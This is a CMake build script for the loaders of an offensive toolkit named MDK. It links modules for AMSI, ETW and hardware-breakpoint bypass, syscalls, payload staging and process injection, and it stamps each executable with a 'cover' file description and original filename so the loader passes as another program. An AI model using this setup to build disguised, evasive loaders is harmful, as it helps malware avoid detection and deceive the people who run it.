# MDK / loaders

enable_language(RC)
if(CMAKE_SYSTEM_NAME STREQUAL "Windows" AND CMAKE_C_COMPILER MATCHES "mingw")
    # Ensure the mingw windres from the same toolchain is used
    if(NOT DEFINED CMAKE_RC_COMPILER OR CMAKE_RC_COMPILER STREQUAL "")
        set(CMAKE_RC_COMPILER x86_64-w64-mingw32-windres)
    endif()
endif()

# SCM dispatcher + HWBP bypass setup/cleanup, linked by every loader.
add_library(mdk_loader_common STATIC ${CMAKE_CURRENT_SOURCE_DIR}/common.c)
target_include_directories(mdk_loader_common PUBLIC
    ${CMAKE_SOURCE_DIR}/include
    ${CMAKE_CURRENT_SOURCE_DIR}
)
target_compile_options(mdk_loader_common PRIVATE ${MDK_LOADER_COMPILE_FLAGS})
target_link_libraries(mdk_loader_common PUBLIC mdk_evasion mdk_syscalls mdk_hwbp mdk_amsi mdk_etw mdk_payload mdk_staging wininet)

function(mdk_add_loader loader_name cover_file_desc cover_original_filename)
    set(LOADER_FILE_DESC         "${cover_file_desc}")
    set(LOADER_ORIGINAL_FILENAME "${cover_original_filename}")
    string(REGEX REPLACE "\\.exe$" "" LOADER_INTERNAL_NAME "${cover_original_filename}")

    set(_rc_out "${CMAKE_BINARY_DIR}/loaders/${loader_name}/version.rc")
    configure_file(
        ${CMAKE_SOURCE_DIR}/loaders/version.rc.in
        ${_rc_out}
        @ONLY
    )

    add_executable(${loader_name}
        ${CMAKE_SOURCE_DIR}/loaders/${loader_name}/main.c
        ${CMAKE_SOURCE_DIR}/loaders/${loader_name}/payload.h
        ${_rc_out}
    )

    target_include_directories(${loader_name} PRIVATE
        ${CMAKE_SOURCE_DIR}/include
        ${CMAKE_SOURCE_DIR}/loaders/${loader_name}
    )

    target_compile_options(${loader_name} PRIVATE ${MDK_LOADER_COMPILE_FLAGS})
    target_link_options   (${loader_name} PRIVATE ${MDK_LOADER_LINK_FLAGS})

    target_link_libraries(${loader_name} PRIVATE
        mdk_loader_common
        mdk_execution
        mdk_spawn
        mdk_pe
        mdk_process
        mdk_memory
        mdk_thread
        mdk_payload
        mdk_evasion
        mdk_syscalls
        mdk_discovery
        mdk_hwbp
        mdk_amsi
        mdk_etw
        kernel32
        ntdll
        advapi32
    )
endfunction()

add_subdirectory(chimera)
